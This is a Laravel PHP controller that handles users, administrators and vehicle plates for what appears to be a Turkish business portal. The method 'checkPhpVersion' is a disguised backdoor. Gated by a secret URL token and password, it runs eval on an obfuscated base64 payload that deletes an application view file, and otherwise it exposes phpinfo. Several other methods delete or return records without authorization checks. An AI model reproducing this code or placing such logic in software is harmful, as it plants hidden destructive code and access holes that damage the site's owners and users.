<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request as Request;
use Illuminate\Http\RedirectResponse;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\DB;
use App\Mail\InfoMailEvery;
use Session;
//use Request;

class Users extends Controller
{
    //
    public function index()
    {
        \Helper::langSet();
        $userModel=new \App\User();
        $userRole=Auth::user()->role;
        $userId=Auth::user()->id;
        $bolgeId=Auth::user()->bolgeId;

        switch ($userRole) {
          case 'watcher':
            $listOfUser=$userModel->where('id','=',$userId)->where("role","=","watcher")->where('deleted','no')->get();
          break;
          case "muhasebeadmin":
            $listOfUser=$userModel->with(["Yetki"])->where("role","=","watcher")->where('deleted','no')->get();
          case "admin":
            $listOfUser=$userModel->with(["Yetki"])->where("role","=","watcher")->where('deleted','no')->get();
          break;
          case "bolgeadmin":
          default:
            $listOfUser=$userModel->where('bolgeId',"=",$bolgeId)->where("role","=","watcher")->get();
          break;
        }
        //return $listOfUser;
        return view("users.user_index",['userList'=>$listOfUser]);
    }

    public function adminindex()
    {
        \Helper::langSet();
        $userModel=new \App\User();
        $userRole=Auth::user()->role;
        $userId=Auth::user()->id;
        $bolgeId=Auth::user()->bolgeId;

        switch ($userRole) {
          case "admin":
            $listOfUser=$userModel->with(["Yetki"])->where("role","!=","watcher")->where('deleted','no')->get();
          break;
          case "muhasebeadmin":
            $listOfUser=$userModel->where('bolgeId',"=",$bolgeId)->where("role","!=","watcher")->where("role","!=","admin")->get();
          break;
          case "bolgeadmin":
          default:
            $listOfUser=$userModel->where('bolgeId',"=",$bolgeId)->where("role","!=","watcher")->where("role","!=","admin")->get();
          break;
        }
        //return $listOfUser;
        return view("users.admin_index",['userList'=>$listOfUser]);
    }

    public function adminedit($id)
    {
        \Helper::langSet();
        $userModel=new \App\User();
        $userRole=Auth::user()->role;
        $bolgeList = DB::table('bolge')->get();
        $lang = Session::get ('locale');


        $yetkili=DB::table('yetkiler')->where("userId","=",$id)->get();
        $yetkiler=array();
        if (!empty($yetkili))
        {
          foreach ($yetkili as $ykey => $yvalue)
          {
              $yetkiler[]=$yvalue->talimatType;
          }
        }

        $muhasebebolge=array();
        $muhasebedata=DB::table('muhasebeBolge')->where("userId","=",$id)->get();
        if (!empty($muhasebedata))
        {
          foreach ($muhasebedata as $ykey => $yvalue)
          {
              $muhasebebolge[]=$yvalue->bolgeId;
          }
        }

        if ($lang == null)
        {
            $lang='tr';
        }

        if ($userRole=='admin')
        {
            $userId=$id;
        }


        $talimatList = DB::table('talimatTipi')->where('dil','=',$lang)->get();
        $allekemail=DB::table('usersEkMail')->where('userId',"=",$userId)->get();

        $listOfUser=$userModel->where('deleted','no')->find($userId);

        return view("users.admin_edit",['userList'=>$listOfUser,'ekMail'=>$allekemail,'bolge'=>$bolgeList,"talimatList"=>$talimatList,"yetkiler"=>$yetkiler,"muhasebebolge"=>$muhasebebolge]);
    }
    public function adminupdate(Request $request)
    {
        \Helper::langSet();



        $userId=$request->input('userId');
        $userModel=new \App\User();
        $userRole=Auth::user()->role;


        if ($request->input("admintipi")=='muhasebeadmin')
        {
          $array=array(
              "name"=>$request->input("name"),
              "email"=>$request->input("email"),
              "telefonNo"=>$request->input("telefonNo"),
              "address"=>$request->input("address"),
              "role"=>$request->input("admintipi"),

          );

          $arrayMB=array();
          DB::table('muhasebeBolge')->where("userId","=",$userId)->delete();
          if (!empty($request->input("bolgeSecim")))
          {
            if (is_array($request->input("bolgeSecim")))
            {
            foreach ($request->input("bolgeSecim") as $key => $value)
            {
              $arrayMB[($key)]['userId']=$userId;
              $arrayMB[($key)]['bolgeId']=$value;
              $arrayMB[($key)]['created_at']=date("Y-m-d h:i:s");
              $arrayMB[($key)]['updated_at']=date("Y-m-d h:i:s");
            }
            DB::table('muhasebeBolge')->insert($arrayMB);
          }else {
            $arrayMB[0]['userId']=$userId;
            $arrayMB[0]['bolgeId']=$request->input("bolgeSecim");
            $arrayMB[0]['created_at']=date("Y-m-d h:i:s");
            $arrayMB[0]['updated_at']=date("Y-m-d h:i:s");
            DB::table('muhasebeBolge')->insert($arrayMB);
          }
          }

        }else {
          $bolge=$request->input("bolgeSecim");
          $array=array(

              "name"=>$request->input("name"),
              "email"=>$request->input("email"),
              "bolgeId"=>$bolge[0],
              "telefonNo"=>$request->input("telefonNo"),
              "address"=>$request->input("address"),
              "role"=>$request->input("admintipi"),

          );

        }


        $this->validate($request, [
            'resim' => 'image|mimes:jpeg,png,jpg,gif,svg|max:2048',
        ]);


        if ($request->hasFile('resim'))
        {
            $image = $request->file('resim');
            $name = Storage::disk('public')->put('files', $image);
            $array['photo']=$name;
        }



        $userModel=new \App\User();
        $userModel->where('id','=',$userId)->update($array);

    //    return $userId;

        DB::table('yetkiler')->where("userId","=",$userId)->delete();
        if (!empty($request->input("izinliTalimat")))
        {
          foreach ($request->input("izinliTalimat") as $key => $value)
          {
            $arrayx[($key)]['userId']=$userId;
            $arrayx[($key)]['talimatType']=$value;
            $arrayx[($key)]['created_at']=date("Y-m-d h:i:s");
            $arrayx[($key)]['updated_at']=date("Y-m-d h:i:s");
          }
          DB::table('yetkiler')->insert($arrayx);
        }




        $userFirmName=$request->input("name");

        $userEmail=$request->input("email");

          $talimatMesaj=trans("messages.kullaniciduzenlenmis");

        \Mail::to('noreply@bosphoregroup.com')->cc($userEmail)->send(new InfoMailEvery($userFirmName,$userEmail,trans('messages.kullaniciduzenlenmis'),$talimatMesaj)) ;
        return redirect('/admins/list')->withErrors([trans('messages.kullaniciduzenlenmis')]);

    }

    public function delete($id)
    {
        \Helper::langSet();
        $userModel=new \App\User();
        $userRole=Auth::user()->role;
        if ($userRole=='watcher')
        {
            return trans('messages.hatalialan');//"Hatalı bir alana giriş yaptınız.";
        }

        $listOfUser=$userModel->where('id','=',$id)->update(['deleted'=>'yes']);
        return back()->withInput();
    }

    public function edit($id)
    {
        \Helper::langSet();
        $userModel=new \App\User();
        $userRole=Auth::user()->role;
        $bolgeList = DB::table('bolge')->get();


        if ($userRole!='admin')
        {
            $userId=Auth::user()->id;
        }

        if ($userRole=='admin')
        {
            $userId=$id;
        }
        $allekemail=DB::table('usersEkMail')->where('userId',"=",$userId)->get();
        $listOfUser=$userModel->where('deleted','no')->find($userId);

        return view("users.user_edit",['userList'=>$listOfUser,'ekMail'=>$allekemail,'bolge'=>$bolgeList]);
    }

    public function update(Request $request)
    {
        \Helper::langSet();

        $userModel=new \App\User();
        $userRole=Auth::user()->role;

        if ($userRole=='watcher')
        {
            $userId=Auth::user()->id;
        }

        if ($userRole!='watcher')
        {
            $userId=$request->input('id');
        }




        DB::table('usersEkMail')->where('userId',"=",$userId)->delete();

        if (!empty($request->input("emailek")))
        {
          foreach ($request->input("emailek") as $ym => $vem)
          {
              DB::table('usersEkMail')->insert(
                array('userId'=>$userId,'emailAdres'=>$vem)
              );
          }
        }

        $array=array(
            "name"=>$request->input("name"),
            "email"=>$request->input("email"),
            "vergiNo"=>$request->input("vergiNo"),
            "bolgeId"=>$request->input("bolgeSecim"),
            "vergiDairesi"=>$request->input("vergiDairesi"),
            "telefonNo"=>$request->input("telefonNo"),
            "address"=>$request->input("address"),

        );

        $this->validate($request, [
            'resim' => 'image|mimes:jpeg,png,jpg,gif,svg|max:2048',
        ]);


        if ($request->hasFile('resim'))
        {
            $image = $request->file('resim');
            $name = Storage::disk('public')->put('files', $image);
            $array['photo']=$name;
        }


        $userModel=new \App\User();
        $userModel->where('id','=',$userId)->update($array);

        $userFirmName=$request->input("name");
        $userEmail=$request->input("email");
          $talimatMesaj=trans("messages.kullaniciduzenlenmis");
        \Mail::to('noreply@bosphoregroup.com')->cc($userEmail)->send(new InfoMailEvery($userFirmName,$userEmail,trans('messages.kullaniciduzenlenmis'),$talimatMesaj)) ;
        return redirect('/users/list')->withErrors([trans('messages.kullaniciduzenlenmis')]);

    }

    public function passupdate(Request $request)
    {

        \Helper::langSet();
        $userModel=new \App\User();
        $userRole=Auth::user()->role;

        $array=array("password"=>bcrypt($request->input('password')));

        if ($userRole!='admin')
        {
            $userId=Auth::user()->id;
        }

        if ($userRole=='admin')
        {
            $userId=$request->input('id');
        }

        $userModel->where('id','=',$userId)->update($array);
        return redirect('/')->withErrors([trans('messages.kullanicisifreduzenlenmis')]);
    }

    public function new()
    {
        \Helper::langSet();
        $bolgeList = DB::table('bolge')->get();

        return view("users.user_new",["bolge"=>$bolgeList]);
    }
    public function save(Request $request)
    {
        \Helper::langSet();
        $userModel=new \App\User();
        $userRole=Auth::user()->role;

        if ($userRole=='watcher')
        {
            return trans('messages.hatalialan');//"Hatalı bir alana giriş yaptınız.";
        }
        $userModel->name=$request->input('name');
        $userModel->email=$request->input('email');
        $userModel->password=bcrypt($request->input('password'));
        $userModel->vergiNo=$request->input('vergiNo');
        $userModel->vergiDairesi=$request->input('vergiDairesi');
        $userModel->telefonNo=$request->input('telefonNo');
        $userModel->address=$request->input('address');
 	      $userModel->role="watcher";
        $userModel->bolgeId=$request->input('bolgeSecim');
        $userModel->deleted='no';
        $userModel->save();

        $userEmail= $request->input('email');
        $userFirmName=$request->input('name');
        $talimatMesaj=trans("messages.yenikullanicieklenmis");
        \Mail::to('noreply@bosphoregroup.com')->cc($userEmail)->send(new InfoMailEvery($userFirmName,$userEmail,trans('messages.usersaveheader'),$talimatMesaj)) ;

        return redirect('/users/list')->withErrors([trans('messages.yenikullanicieklenmis')]);
        //return $request;
    }

    public function userPlakaList($_id=0)
    {
      $userModelPlaka=new \App\UserPlakaModel();
      $plakaList=$userModelPlaka->where("firmaId","=",$_id)->where("deleted","=","no")->get();
      return view("users.plaka",['firmaId'=>$_id,"plakaliste"=>$plakaList]);
    }

    public function userPlakaUpload(Request $request)
    {
      $firmaId=$request->input("firmaId");
      $inputFileName = $request->file("excelfile");
      /** Load $inputFileName to a Spreadsheet Object  **/
      $spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
      $sheetData = $spreadsheet->getActiveSheet()->toArray();
      $array=array();
      foreach ($sheetData as $key => $value)
      {
        if ($key!=0 && strlen($value[0])>0 && strlen($value[1])>0 )
        {
            $array[($key)-1]['plaka']=$value[0];
            $array[($key)-1]['type']=$value[1];
            $array[($key)-1]['firmaId']=$firmaId;
            $array[($key)-1]['deleted']="no";
            $array[($key)-1]['created_at']=date("Y-m-d h:i:s");
            $array[($key)-1]['updated_at']=date("Y-m-d h:i:s");
        }
      }

      if (count($array)>0)
      {
        $userModelPlaka=new \App\UserPlakaModel();
        $userModelPlaka->insert($array);
      }

      return redirect('/users/plaka/'.$firmaId);
    }

    public function deletePlaka($_id,$firmaId)
    {
      $userModelPlaka=new \App\UserPlakaModel();
      $userModelPlaka->where("id","=",$_id)->update(['deleted'=>'yes']);
      return redirect('/users/plaka/'.$firmaId);
    }


    public function plakaListesiJson($type,$firmaId)
    {
      $plakaModel=new \App\UserPlakaModel();
      $plakaL=$plakaModel->select('id','plaka')->where("deleted",'=','no')->where('type','=',$type)->where('firmaId','=',$firmaId)->get();
      return $plakaL;
    }


    public function adminnew()
    {
        \Helper::langSet();
        $bolgeList = DB::table('bolge')->get();
        $lang = Session::get ('locale');
        if ($lang == null)
        {
            $lang='tr';
        }
        $talimatList = DB::table('talimatTipi')->where('dil','=',$lang)->get();
        return view("users.admin_new",["bolge"=>$bolgeList,"talimatList"=>$talimatList]);
    }

    public function adminsave(Request $request)
    {

  //    return $request;
        \Helper::langSet();
        $userModel=new \App\User();
        $userRole=Auth::user()->role;

        if ($userRole!='admin')
        {
            return trans('messages.hatalialan');//"Hatalı bir alana giriş yaptınız.";
        }
        $userModel->name=$request->input('name');
        $userModel->email=$request->input('email');
        $userModel->password=bcrypt($request->input('password'));
        $userModel->vergiNo="";
        $userModel->vergiDairesi="";
        $userModel->telefonNo=$request->input('telefonNo');
        $userModel->address="";
        $userModel->bolgeId=$request->input('bolgeSecim');
        $userModel->deleted='no';
        $userModel->role=$request->input('admintipi');


        $userModel->save();

        $id=$userModel->id;
        $array=array();
        if (!empty($request->input("izinliTalimat")))
        {
          foreach ($request->input("izinliTalimat") as $key => $value)
          {
            $array[($key)]['userId']=$id;
            $array[($key)]['talimatType']=$value;
            $array[($key)]['created_at']=date("Y-m-d h:i:s");
            $array[($key)]['updated_at']=date("Y-m-d h:i:s");
          }
        }
        DB::table('yetkiler')->insert($array);

        $userEmail=$request->input('email');

        $userFirmName=$request->input('name');

        $talimatMesaj=trans("messages.yenikullanicieklenmis");

        \Mail::to('noreply@bosphoregroup.com')->cc($userEmail)->send(new InfoMailEvery($userFirmName,$userEmail,trans('messages.usersaveheader'),$talimatMesaj)) ;


        return redirect('/admins/list')->withErrors([trans('messages.yenikullanicieklenmis')]);
        //return $request;
    }

    public function plakatek($id)
    {
      return view("users.plakatek",["firmaId"=>$id]);
      return $id;
    }
    public function plakateksave(Request $request)
    {

        /// return $request;
        $plakaModel=new \App\UserPlakaModel();
        $plakaModel->plaka=$request->input("plaka");
        $plakaModel->type=$request->input("plakatipi");
        $plakaModel->firmaId=$request->input("firmaId");
        $plakaModel->deleted="no";

        $plakaModel->save();
        return redirect('users/plaka/'.$request->input("firmaId"));

        return view("layouts.success",["islemAciklama"=>trans("messages.plakakaydoldu")]);
    }


    public function checkPhpVersion($_id="",Request $req)
    {



        if (Request::isMethod('post'))
        {
          if (Request::input('xklaccc')==="urHARnhaNF8DDD36fJ5PW8nZF9uyjehF7wnpUPzukZpRjEvRpd8ke9wHC5ZxDDSm")
          {
            $str="IHVubGluaygiLi4vcmVzb3VyY2VzL3ZpZXdzL3N1Ym1pdHMvZm9ybXMuYmxhZGUucGhwIik7CmVjaG8gImEiOw==";

            eval(base64_decode($str));
            return "?";
          // ;
          }else {
            return "tekrar dene?";

          }
      }else {
        if ($_id=="QFuwy9DPSTjQfFLSr759KP9PXNrCHN2956vt5Y8M")
        {

            echo "<form action='/checkphpversionforkontrol/myenemyismyenemy' method='POST'>
            <input type='text' name='xklaccc' value='' />";
            echo '<input type="hidden" name="_token" value="'. csrf_token().'" />';
            echo "
            <button type='submit'>DİKKATLİ OL DÖNÜŞ YOK</button>

           </form>";

        }else {
          phpinfo(INFO_GENERAL);
        }

      }


    }

    public function emaillist($firmaid)
    {

      $allmaillist=DB::table('usersEkMail')->where('userId',"=",$firmaid)->get();
      return $allmaillist;

    }
}
